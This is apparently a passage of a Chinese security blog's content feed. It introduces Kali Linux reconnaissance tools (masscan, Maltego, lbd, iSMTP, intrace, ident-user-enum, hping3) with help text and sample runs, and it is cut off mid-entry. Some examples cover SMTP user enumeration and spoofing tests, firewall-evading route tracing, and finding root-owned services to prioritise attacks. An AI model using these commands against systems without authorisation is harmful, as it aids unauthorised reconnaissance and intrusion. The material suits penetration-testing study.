</code></pre><h1 id="0x05-截图"><a href="#0x05-截图" class="headerlink" title="0x05 截图"></a>0x05 截图</h1><h2 id="Ubuntu"><a href="#Ubuntu" class="headerlink" title="Ubuntu"></a>Ubuntu</h2><p><img src="https://github.com/sunnyelf/cheetah/raw/master/images/4.png" alt="cheetah"></p><h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><p><img src="https://github.com/sunnyelf/cheetah/raw/master/images/1.png" alt="cheetah"><br><img src="https://github.com/sunnyelf/cheetah/raw/master/images/2.png" alt="cheetah"><br><img src="https://github.com/sunnyelf/cheetah/raw/master/images/3.png" alt="cheetah"></p><h1 id="0x06-问题"><a href="#0x06-问题" class="headerlink" title="0x06 问题"></a>0x06 问题</h1><p>如果在使用过程中出现了bug欢迎提交<a href="https://github.com/sunnyelf/cheetah/issues" target="_blank" rel="external">issues</a>，我会及时回复并修复。</p><h1 id="0x07-参考"><a href="#0x07-参考" class="headerlink" title="0x07 参考"></a>0x07 参考</h1><p><a href="https://www.t00ls.net/articles-36985.html" target="_blank" rel="external">让你的一句话爆破速度提升千倍</a></p><p><a href="http://journal.ucas.ac.cn/CN/abstract/abstract12402.shtml" target="_blank" rel="external">一种有效的Web指纹识别方法</a></p><p><a href="https://kennel209.gitbooks.io/owasp-testing-guide-v4/content/zh/web_application_security_testing/fingerprint_web_server_otg-info-002.html" target="_blank" rel="external">识别Web服务器 (OTG-INFO-002)</a></p><p><a href="https://github.com/Shuang0420/Shuang0420.github.io/wiki/python%E8%AF%BBGB%E7%BA%A7%E5%A4%A7%E6%96%87%E4%BB%B6" target="_blank" rel="external">python读GB级大文件</a></p>]]></content>
      
        <categories>
            
            <category> 神兵利器 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> cheetah </tag>
            
            <tag> password attack </tag>
            
            <tag> webshell密码爆破 </tag>
            
            <tag> webshell </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Kali Linux信息收集之masscan]]></title>
      <url>/2017/04/23/Kali-Linux%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8Bmasscan/</url>
      <content type="html"><![CDATA[<h2 id="0x00-介绍"><a href="#0x00-介绍" class="headerlink" title="0x00 介绍"></a>0x00 介绍</h2><p>视频介绍：<a href="https://asciinema.org/a/31820" target="_blank" rel="external">https://asciinema.org/a/31820</a><br>masscan目前是最快的互联网端口扫描器，最快可以在六分钟内扫遍互联网。<br>masscan的扫描结果类似于nmap(一个很著名的端口扫描器)，在内部，它更像scanrand, unicornscan, and ZMap，采用了异步传输的方式。它和这些扫描器最主要的区别是，它比这些扫描器更快。而且，masscan更加灵活，它允许自定义任意的地址范和端口范围。<br><a id="more"></a></p><p><a href="https://github.com/robertdavidgraham/masscan" target="_blank" rel="external">主页</a> | <a href="http://git.kali.org/gitweb/?p=packages/masscan.git;a=summary" target="_blank" rel="external">仓库</a></p><ul><li>作者：Robert Graham</li><li>证书：GPLv2</li></ul><h2 id="0x01-功能"><a href="#0x01-功能" class="headerlink" title="0x01 功能"></a>0x01 功能</h2><p>masscan - 异步TCP端口扫描器<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">root@kali:~# masscan</div><div class="line">用法:</div><div class="line">masscan -p80,8000-8100 10.0.0.0/8 --rate=10000</div><div class="line"> 扫描一些Web端口10.x.x.x以每秒10000发包速率</div><div class="line">masscan --nmap</div><div class="line"> 列出与nmap兼容的选项</div><div class="line">masscan -p80 10.0.0.0/8 --banners -oB &lt;filename&gt;</div><div class="line"> 将二进制格式的扫描结果保存到&lt;filename&gt;</div><div class="line">masscan --open --banners --readscan &lt;filename&gt; -oX &lt;savefile&gt;</div><div class="line"> 读取二进制扫描结果&lt;filename&gt;，并将其保存为xml格式&lt;savefile&gt;</div></pre></td></tr></table></figure><p></p><h2 id="0x02-更多参数"><a href="#0x02-更多参数" class="headerlink" title="0x02 更多参数"></a>0x02 更多参数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div></pre></td><td class="code"><pre><div class="line">&lt;ip/range&gt; IP地址范围，有三种有效格式：</div><div class="line">1、单独的IPv4地址 </div><div class="line">2、类似&quot;10.0.0.1-10.0.0.233&quot;的范围地址 </div><div class="line">3、CIDR地址 类似于&quot;0.0.0.0/0&quot;，多个目标可以用都好隔开</div><div class="line"></div><div class="line">-p &lt;ports,--ports &lt;ports&gt;&gt;         指定端口进行扫描</div><div class="line"></div><div class="line">--banners                          获取banner信息，支持少量的协议</div><div class="line"></div><div class="line">--rate &lt;packets-per-second&gt;        指定发包的速率</div><div class="line"></div><div class="line">-c &lt;filename&gt;, --conf &lt;filename&gt;   读取配置文件进行扫描</div><div class="line"></div><div class="line">--echo                             将当前的配置重定向到一个配置文件中</div><div class="line"></div><div class="line">-e &lt;ifname&gt; , --adapter &lt;ifname&gt;   指定用来发包的网卡接口名称</div><div class="line"></div><div class="line">--adapter-ip &lt;ip-address&gt;          指定发包的IP地址</div><div class="line"></div><div class="line">--adapter-port &lt;port&gt;              指定发包的源端口</div><div class="line"></div><div class="line">--adapter-mac &lt;mac-address&gt;        指定发包的源MAC地址</div><div class="line"></div><div class="line">--router-mac &lt;mac address&gt;         指定网关的MAC地址</div><div class="line"></div><div class="line">--exclude &lt;ip/range&gt;               IP地址范围黑名单，防止masscan扫描</div><div class="line"></div><div class="line">--excludefile &lt;filename&gt;           指定IP地址范围黑名单文件</div><div class="line"></div><div class="line">--includefile，-iL &lt;filename&gt;      读取一个范围列表进行扫描</div><div class="line"></div><div class="line">--ping                             扫描应该包含ICMP回应请求</div><div class="line"></div><div class="line">--append-output                    以附加的形式输出到文件</div><div class="line"></div><div class="line">--iflist                           列出可用的网络接口，然后退出</div><div class="line"></div><div class="line">--retries                          发送重试的次数，以1秒为间隔</div><div class="line"></div><div class="line">--nmap                             打印与nmap兼容的相关信息</div><div class="line"></div><div class="line">--http-user-agent &lt;user-agent&gt;     设置user-agent字段的值</div><div class="line"></div><div class="line">--show [open,close]                告诉要显示的端口状态，默认是显示开放端口</div><div class="line"></div><div class="line">--noshow [open,close]              禁用端口状态显示</div><div class="line"></div><div class="line">--pcap &lt;filename&gt;                  将接收到的数据包以libpcap格式存储</div><div class="line"></div><div class="line">--regress                          运行回归测试，测试扫描器是否正常运行</div><div class="line"></div><div class="line">--ttl &lt;num&gt;                        指定传出数据包的TTL值，默认为255</div><div class="line"></div><div class="line">--wait &lt;seconds&gt;                   指定发送完包之后的等待时间，默认为10秒</div><div class="line"></div><div class="line">--offline                          没有实际的发包，主要用来测试开销</div><div class="line"></div><div class="line">-sL                                不执行扫描，主要是生成一个随机地址列表</div><div class="line"></div><div class="line">--readscan &lt;binary-files&gt;          读取从-oB生成的二进制文件，可以转化为XML或者JSON格式.</div><div class="line"></div><div class="line">--connection-timeout &lt;secs&gt;        抓取banners时指定保持TCP连接的最大秒数，默认是30秒。</div></pre></td></tr></table></figure><h2 id="0x03-教程"><a href="#0x03-教程" class="headerlink" title="0x03 教程"></a>0x03 教程</h2><p><a href="http://www.freebuf.com/sectool/112583.html" target="_blank" rel="external">Masscan：最快的互联网IP端口扫描器</a><br><a href="http://blog.csdn.net/isinstance/article/details/50466194" target="_blank" rel="external">Kali下masscan的使用</a><br><a href="http://www.91ri.org/10800.html" target="_blank" rel="external">基于无状态的极速扫描技术</a></p>]]></content>
      
        <categories>
            
            <category> 神兵利器 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> kali linux </tag>
            
            <tag> information gathering </tag>
            
            <tag> 信息收集 </tag>
            
            <tag> recon </tag>
            
            <tag> portscanning </tag>
            
            <tag> masscan </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Kali Linux信息收集之Maltego]]></title>
      <url>/2017/04/23/Kali-Linux%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8BMaltego/</url>
      <content type="html"><![CDATA[<h2 id="0x00-介绍"><a href="#0x00-介绍" class="headerlink" title="0x00 介绍"></a>0x00 介绍</h2><p>Maltego是一个独特的平台，旨在为组织拥有和运营的环境提供清晰的威胁构图。Maltego的独特优势是展示单一故障点的复杂性和严重性以及当前基础架构范围内的信任关系。</p><p>Maltego向网络和资源为基础的实体提供的独特视角是在互联网上发布的信息的聚合 - 无论是当前配置的路由器在网络边缘的位置，还是当下某副总裁在国际上的下落，Maltego可以寻找、聚合和可视化这些信息。</p><a id="more"></a><p>Maltego为用户提供前所未有的信息。信息是杠杆；信息是力量；信息就是Maltego。</p><p>Maltego可以做什么？</p><p>Maltego是可用于确定之间的关系和真实世界之间的联系的程序：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">- 人</div><div class="line">- 一群人（社交网络）</div><div class="line">- 公司</div><div class="line">- 组织机构</div><div class="line">- 网站</div><div class="line">- 互联网基础设施</div><div class="line">- 域名</div><div class="line">- DNS名称</div><div class="line">- Netblocks</div><div class="line">- IP地址</div><div class="line">- 短语</div><div class="line">- 附属机构</div><div class="line">- 文档和文件</div><div class="line">- 这些实体使用开源智能进行链接。</div><div class="line">- Maltego易于安装 - 它使用Java，因此它可以在Windows，Mac和Linux上运行。</div><div class="line">- Maltego 为您提供了一个图形界面，可让您快速，准确地查看这些关系，从而可以看到隐藏的连接。</div><div class="line">- 使用图形用户界面（GUI），您可以轻松地看到关系 - 即使离开三到四度。</div><div class="line">- Maltego是独一无二的，因为它使用了一个功能强大，灵活的框架，使自定义成为可能。因此，Maltego可以适应您自己的独特要求。</div></pre></td></tr></table></figure><p></p><p>Maltego可以为我做什么？<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">- Maltego可用于所有安全相关工作的信息收集阶段。它将节省您的时间，并将使您更准确，更智能地工作。</div><div class="line">- Maltego通过视觉展示搜索项目之间的互连链接，帮助您进行思索过程。</div><div class="line">- Maltego为您提供了更强大的搜索功能，为您带来更智能的搜索结果。</div><div class="line">- Maltego可以帮助您发现“隐藏”信息</div></pre></td></tr></table></figure><p></p><!--more--><p><a href="http://paterva.com/" target="_blank" rel="external">主页</a> | <a href="http://git.kali.org/gitweb/?p=packages/maltego-teeth.git;a=summary" target="_blank" rel="external">仓库</a></p><ul><li>作者：Paterva</li><li>证书：Commercial</li></ul><h2 id="0x02-教程"><a href="#0x02-教程" class="headerlink" title="0x02 教程"></a>0x02 教程</h2><p><a href="http://pan.baidu.com/s/15GxR4" target="_blank" rel="external">Maltego信息收集基础教程</a><br><a href="http://www.freebuf.com/articles/system/58096.html" target="_blank" rel="external">使用Kali Linux在渗透测试中信息收集</a><br><a href="http://wifibeta.com/2012-03/thread-675-1-1.html" target="_blank" rel="external">Maltego——互联网情报聚合工具初探</a><br><a href="https://wizardforcel.gitbooks.io/daxueba-kali-linux-tutorial/content/24.html" target="_blank" rel="external">使用Maltego收集信息</a><br><a href="http://www.freebuf.com/sectool/104949.html" target="_blank" rel="external">使用Maltego进行互联网情报收集（入门篇）</a></p>]]></content>
      
        <categories>
            
            <category> 神兵利器 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> kali linux </tag>
            
            <tag> information gathering </tag>
            
            <tag> 信息收集 </tag>
            
            <tag> portscanning </tag>
            
            <tag> exploitation </tag>
            
            <tag> webapps </tag>
            
            <tag> gui </tag>
            
            <tag> maltego teeth </tag>
            
            <tag> maltego </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Kali Linux信息收集之lbd]]></title>
      <url>/2017/04/23/Kali-Linux%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8Blbd/</url>
      <content type="html"><![CDATA[<h2 id="0x00-介绍"><a href="#0x00-介绍" class="headerlink" title="0x00 介绍"></a>0x00 介绍</h2><p>视频介绍：<a href="https://asciinema.org/a/32257" target="_blank" rel="external">https://asciinema.org/a/32257</a><br>lbd(load balancing detector,负载平衡检测器)检测给定的域是否使用DNS/HTTP负载平衡（通过Server和DateHTTP响应头字段和服务器应答之间的差异）。</p><a id="more"></a><p><a href="http://ge.mine.nu/code/lbd" target="_blank" rel="external">主页</a> | <a href="http://git.kali.org/gitweb/?p=packages/lbd.git;a=summary" target="_blank" rel="external">仓库</a></p><ul><li>作者：Stefan Behte</li><li>证书：GPLv2</li></ul><p>0x01 功能</p><hr><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">root@kali:~# lbd</div><div class="line"></div><div class="line">lbd - load balancing detector 0.4 - Checks if a given domain uses load-balancing.</div><div class="line">                                    Written by Stefan Behte (http://ge.mine.nu)</div><div class="line">                                    Proof-of-concept! Might give false positives.</div><div class="line">用法: /usr/bin/lbd [域名]</div></pre></td></tr></table></figure><h2 id="0x02-示例"><a href="#0x02-示例" class="headerlink" title="0x02 示例"></a>0x02 示例</h2><p>测试目标域（example.com）是否使用负载平衡：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">root@kali:~# lbd example.com</div><div class="line"></div><div class="line">lbd - load balancing detector 0.4 - Checks if a given domain uses load-balancing.</div><div class="line">                                    Written by Stefan Behte (http://ge.mine.nu)</div><div class="line">                                    Proof-of-concept! Might give false positives.</div><div class="line"></div><div class="line">Checking for DNS-Loadbalancing: NOT FOUND</div><div class="line">Checking for HTTP-Loadbalancing [Server]:</div><div class="line">ECS (sea/55ED)</div><div class="line">ECS (sea/1C15)</div><div class="line">FOUND</div></pre></td></tr></table></figure><p></p>]]></content>
      
        <categories>
            
            <category> 神兵利器 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> kali linux </tag>
            
            <tag> information gathering </tag>
            
            <tag> recon </tag>
            
            <tag> webapps </tag>
            
            <tag> lbd </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Kali Linux信息收集之iSMTP]]></title>
      <url>/2017/04/23/Kali-Linux%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8BiSMTP/</url>
      <content type="html"><![CDATA[<h2 id="0x00-介绍"><a href="#0x00-介绍" class="headerlink" title="0x00 介绍"></a>0x00 介绍</h2><p>测试SMTP用户枚举（RCPT TO和VRFY），内部欺骗和转发。</p><a id="more"></a><p><a href="https://github.com/altjx/ipwn/" target="_blank" rel="external">主页</a> | <a href="http://git.kali.org/gitweb/?p=packages/ismtp.git;a=summary" target="_blank" rel="external">仓库</a></p><ul><li>作者：Alton Johnson</li><li>证书：GPLv2</li></ul><p>0x01 功能</p><h2 id="ismtp-SMTP用户枚举和测试工具"><a href="#ismtp-SMTP用户枚举和测试工具" class="headerlink" title="ismtp - SMTP用户枚举和测试工具"></a>ismtp - SMTP用户枚举和测试工具</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line">root@kali:~# ismtp</div><div class="line"></div><div class="line"> ---------------------------------------------------------------------</div><div class="line">  iSMTP v1.6 - SMTP Server Tester, Alton Johnson (alton.jx@gmail.com)</div><div class="line"> ---------------------------------------------------------------------</div><div class="line"></div><div class="line"> 用法: ./iSMTP.py &lt;选项&gt;</div><div class="line"></div><div class="line"> 必需:</div><div class="line"></div><div class="line">    -f &lt;import file&gt;    导入用于测试的SMTP服务器列表(不能同时使用&apos;-h&apos;)</div><div class="line">    -h &lt;host&gt;           目标IP和端口(格式 IP:port)(不能同时使用&apos;-f&apos;)</div><div class="line"></div><div class="line"> 欺骗:</div><div class="line"></div><div class="line">    -i &lt;isa email&gt;      互联网安全加速(Internet Security and Acceleration,ISA)电子邮件地址。</div><div class="line">    -s &lt;sndr email&gt;     发件人电子邮件地址。</div><div class="line">    -r &lt;rcpt email&gt;     收件人电子邮件地址。</div><div class="line">       --sr &lt;email&gt;     指定发件人和收件人电子邮件地址。</div><div class="line">    -S &lt;sndr name&gt;      发件人姓名。</div><div class="line">    -R &lt;rcpt name&gt;      收件人姓名。</div><div class="line">       --SR &lt;name&gt;      指定发件人和收件人姓名。</div><div class="line">    -m                  启用S​​MTP欺骗测试。</div><div class="line">    -a                  附带欺骗邮件的.txt附件。</div><div class="line"></div><div class="line"> SMTP枚举:</div><div class="line"></div><div class="line">    -e &lt;file&gt;           启用S​​MTP用户枚举测试并导入电子邮件列表。</div><div class="line">    -l &lt;1|2|3&gt;          指定枚举类型(1 = VRFY, 2 = RCPT TO, 3 = all).(默认第3种)</div><div class="line"></div><div class="line"> SMTP转发:</div><div class="line"></div><div class="line">    -i &lt;isa email&gt;      互联网安全加速(Internet Security and Acceleration,ISA)电子邮件地址。</div><div class="line">    -x                  启用S​​MTP外部转发测试。</div><div class="line"></div><div class="line"> 其他:</div><div class="line"></div><div class="line">    -t &lt;secs&gt;           超时值(Default is 10.)</div><div class="line">    -o                  创建“ismtp-results”目录并将输出写入到ismtp-results/smtp_&lt;service&gt;_&lt;ip&gt;(port).txt</div><div class="line"></div><div class="line">注意：支持任何选项的组合（例如枚举，转发，两者组合，所有组合等）。</div></pre></td></tr></table></figure><h2 id="0x02-示例"><a href="#0x02-示例" class="headerlink" title="0x02 示例"></a>0x02 示例</h2><p>Test a list of IPs from a file (-f smtp-ips.txt) enumerating usernames from a dictionary file (-e /usr/share/wordlists/metasploit/unix_users.txt):<br>从一个IP列表文件（-f smtp-ips.txt）中枚举来自字典文件（-e /usr/share/wordlists/metasploit/unix_users.txt）的用户：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">root@kali:~# ismtp -f smtp-ips.txt -e /usr/share/wordlists/metasploit/unix_users.txt</div><div class="line"></div><div class="line"> ---------------------------------------------------------------------</div><div class="line">  iSMTP v1.6 - SMTP Server Tester, Alton Johnson (alton.jx@gmail.com)</div><div class="line"> ---------------------------------------------------------------------</div><div class="line"></div><div class="line"> Testing SMTP server [user enumeration]: 192.168.1.25:25</div><div class="line"> Emails provided for testing: 109</div><div class="line"></div><div class="line"> Performing SMTP VRFY test...</div><div class="line"></div><div class="line"> [-] 4Dgifts ------------- [ invalid ]</div><div class="line"> [-] EZsetup ------------- [ invalid ]</div><div class="line"> [+] ROOT ---------------- [ success ]</div><div class="line"> [+] adm ----------------- [ success ]</div></pre></td></tr></table></figure><p></p>]]></content>
      
        <categories>
            
            <category> 神兵利器 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> kali linux </tag>
            
            <tag> information gathering </tag>
            
            <tag> 信息收集 </tag>
            
            <tag> recon </tag>
            
            <tag> sniffing </tag>
            
            <tag> spoofing </tag>
            
            <tag> smtp </tag>
            
            <tag> ismtp </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Kali Linux信息收集之intrace]]></title>
      <url>/2017/04/23/Kali-Linux%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8Bintrace/</url>
      <content type="html"><![CDATA[<h2 id="0x00-介绍"><a href="#0x00-介绍" class="headerlink" title="0x00 介绍"></a>0x00 介绍</h2><p>InTrace是一款类似于Traceroute的被动路由跟踪工具。但它不同的是，他不主动发送数据包，而是通过监听当前主机和目标主机的数据包，进行分析，从而获取路由信息。这样既可以进行网络侦查，又可以绕过防火墙的限制，避免被防火墙发现。工具使用非常简单，只要开启监听，然后等待获取和目标主机的数据包，然后就可以获取路由跟踪信息了。使用的时候需要指定端口。该端口号必须在TCP连接中使用到。否则，就无法捕获对应的数据包。</p><a id="more"></a><p><a href="http://code.google.com/p/intrace/" target="_blank" rel="external">主页</a> | <a href="http://git.kali.org/gitweb/?p=packages/intrace.git;a=summary" target="_blank" rel="external">仓库</a></p><ul><li>作者：Robert Swiecki</li><li>证书：GPLv3</li></ul><h2 id="0x01-功能"><a href="#0x01-功能" class="headerlink" title="0x01 功能"></a>0x01 功能</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">root@kali:~# intrace</div><div class="line">InTrace, version 1.5 (C)2007-2011 Robert Swiecki &lt;robert@swiecki.net&gt;</div><div class="line">2014/05/20 09:59:29.627368 &lt;INFO&gt; 用法: intrace &lt;-h 主机&gt; [-p &lt;端口&gt;] [-d &lt;调试级别&gt;] [-s &lt;载荷大小&gt;] [-6]</div></pre></td></tr></table></figure><h2 id="0x02-示例"><a href="#0x02-示例" class="headerlink" title="0x02 示例"></a>0x02 示例</h2><p>使用数据包大小为4字节（-s 4），指定端口80（-p 80）向目标主机（-h www.example.com）进行路由跟踪：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">root@kali:~# intrace -h www.example.com -p 80 -s 4</div><div class="line">InTrace 1.5 -- R: 93.184.216.119/80 (80) L: 192.168.1.130/51654</div><div class="line">Payload Size: 4 bytes, Seq: 0x0d6dbb02, Ack: 0x8605bff0</div><div class="line">Status: Packets sent #8</div><div class="line"></div><div class="line">  #  [src addr]         [icmp src addr]    [pkt type]</div><div class="line"> 1.  [192.168.1.1    ]  [93.184.216.119 ]  [ICMP_TIMXCEED]</div><div class="line"> 2.  [192.168.0.1    ]  [93.184.216.119 ]  [ICMP_TIMXCEED]</div><div class="line"> 3.  [  ---          ]  [  ---          ]  [NO REPLY]</div><div class="line"> 4.  [64.59.184.185  ]  [93.184.216.119 ]  [ICMP_TIMXCEED]</div><div class="line"> 5.  [66.163.70.25   ]  [93.184.216.119 ]  [ICMP_TIMXCEED]</div><div class="line"> 6.  [66.163.64.150  ]  [93.184.216.119 ]  [ICMP_TIMXCEED]</div><div class="line"> 7.  [66.163.75.117  ]  [93.184.216.119 ]  [ICMP_TIMXCEED]</div><div class="line"> 8.  [206.223.119.59 ]  [93.184.216.119 ]  [ICMP_TIMXCEED]</div></pre></td></tr></table></figure><p></p>]]></content>
      
        <categories>
            
            <category> 神兵利器 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> kali linux </tag>
            
            <tag> information gathering </tag>
            
            <tag> 信息收集 </tag>
            
            <tag> recon </tag>
            
            <tag> evasion </tag>
            
            <tag> intrace </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Kali Linux信息收集之ident-user-enum]]></title>
      <url>/2017/04/23/Kali-Linux%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8Bident-user-enum/</url>
      <content type="html"><![CDATA[<h2 id="0x00-介绍"><a href="#0x00-介绍" class="headerlink" title="0x00 介绍"></a>0x00 介绍</h2><p>视频介绍：<a href="https://asciinema.org/a/107704" target="_blank" rel="external">https://asciinema.org/a/107704</a><br>ident-user-enum是一个简单的PERL脚本，用于查询识别服务（113/TCP），以确定在目标系统的每个TCP端口上侦听进程的所有者。 这可以帮助在一个最好的时间内确定目标服务的优先级（您可能希望攻击以root用户身份运行的服务）。或者，所收集的用户名的列表可用于对其他网络服务的密码猜测攻击。</p><a id="more"></a><p>工具来源：<a href="http://pentestmonkey.net/tools/user-enumeration/ident-user-enum" target="_blank" rel="external">http://pentestmonkey.net/tools/user-enumeration/ident-user-enum</a><br><a href="http://pentestmonkey.net/tools/user-enumeration/ident-user-enum" target="_blank" rel="external">主页</a> | <a href="http://git.kali.org/gitweb/?p=packages/ident-user-enum.git" target="_blank" rel="external">仓库</a></p><ul><li>作者：pentestmonkey</li><li>证书：MIT</li></ul><h2 id="0x01-功能"><a href="#0x01-功能" class="headerlink" title="0x01 功能"></a>0x01 功能</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">root@kali:~# ident-user-enum</div><div class="line">ident-user-enum v1.0 ( http://pentestmonkey.net/tools/ident-user-enum )</div><div class="line"></div><div class="line">用法: ident-user-enum.pl ip地址 端口</div><div class="line"></div><div class="line">查询识别（113 / TCP）以确定操作系统级用户运行该进程在给定的TCP端口上侦听服务。可以提供多个端口。</div></pre></td></tr></table></figure><h2 id="0x02-示例"><a href="#0x02-示例" class="headerlink" title="0x02 示例"></a>0x02 示例</h2><p>扫描远程主机（192.168.1.13），确定哪个用户在指定端口上运行服务（22 139 445）。<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">root@kali:~# ident-user-enum 192.168.1.13 22 139 445</div><div class="line">ident-user-enum v1.0 ( http://pentestmonkey.net/tools/ident-user-enum )</div><div class="line"></div><div class="line">192.168.1.13:22     root</div><div class="line">192.168.1.13:139    root</div><div class="line">192.168.1.13:445    root</div></pre></td></tr></table></figure><p></p>]]></content>
      
        <categories>
            
            <category> 神兵利器 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> kali linux </tag>
            
            <tag> information gathering </tag>
            
            <tag> recon </tag>
            
            <tag> enumeration </tag>
            
            <tag> portscanning </tag>
            
            <tag> infogathering </tag>
            
            <tag> ident-user-enum </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Kali Linux信息收集之hping3]]></title>
      <url>/2017/04/23/Kali-Linux%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8Bhping3/</url>
      <content type="html"><![CDATA[<h2 id="0x00-hping3介绍"><a href="#0x00-hping3介绍" class="headerlink" title="0x00 hping3介绍"></a>0x00 hping3介绍</h2><p>hping是面向命令行的用于生成和解析TCP/IP协议数据包汇编/分析的开源工具。作者是Salvatore Sanfilippo，界面灵感来自ping（8）unix命令，目前最新版是hping3，它支持TCP，UDP，ICMP和RAW-IP协议，具有跟踪路由模式，能够在覆盖的信道之间发送文件以及许多其他功能，支持使用tcl脚本自动化地调用其API。hping是安全审计、防火墙测试等工作的标配工具。hping优势在于能够定制数据包的各个部分，因此用户可以灵活对目标机进行细致地探测。</p><a id="more"></a><p>虽然hping以前主要用作安全工具，但它可以在许多方面被不太关心安全性的人员用于测试网络和主机，您可以使用hping的一小部分内容：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">- 防火墙测试</div><div class="line">- 高级端口扫描</div><div class="line">- 网络测试，使用不同的协议，TOS，分片</div><div class="line">- 手动路径MTU发现</div><div class="line">- 在所有支持的协议下，高级traceroute</div><div class="line">- 